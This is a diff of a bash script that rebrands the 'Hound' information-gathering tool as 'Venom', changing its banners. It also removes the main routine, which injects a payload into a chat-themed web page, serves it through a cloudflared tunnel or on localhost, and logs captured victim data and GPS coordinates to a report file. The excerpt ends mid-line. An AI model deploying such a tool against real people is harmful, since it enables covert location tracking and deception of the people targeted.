@@ -1,5 +1,5 @@
 #!/bin/bash
-# Hound v 0.2
+# Venom v 0.2
 # Powered by TechChip
 # visit https://youtube.com/techchipnet
 
@@ -12,10 +12,10 @@ printf '       ██   ██ ██    ██ ██    ██ ████   
 printf '       ███████ ██    ██ ██    ██ ██ ██  ██ ██   ██ \n'
 printf '       ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██ \n'
 printf '       ██   ██  ██████   ██████  ██   ████ ██████  \n\n'
-printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
-printf " \e[1;93m      Hound Ver 0.2 - by Anil Parashar [TechChip]\e[0m \n"
+printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
+printf " \e[1;93m      Venom Ver 0.2 - by Anil Parashar [TechChip]\e[0m \n"
 printf " \e[1;92m      www.techchip.net | youtube.com/techchipnet \e[0m \n"
-printf "\e[1;90m Hound is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
+printf "\e[1;90m Venom is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
 printf "\n"
 }
 
@@ -113,28 +113,5 @@ php -S 127.0.0.1:8080 > /dev/null 2>&1 &
 sleep 2
 checkfound
 }
-hound() {
-if [[ -e data.txt ]]; then
-cat data.txt >> targetreport.txt
-rm -rf data.txt
-touch data.txt
-fi
-if [[ -e ip.txt ]]; then
-rm -rf ip.txt
-fi
-sed -e '/tc_payload/r payload' index_chat.html > index.html
-default_option_server="Y"
-read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
-option_server="${option_server:-${default_option_server}}"
-if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
-cf_server
-sleep 1
-else
-local_server
-sleep 1
-fi
-}
-
-banner
-dependencies
-hound
+venom() {
+if [[ -
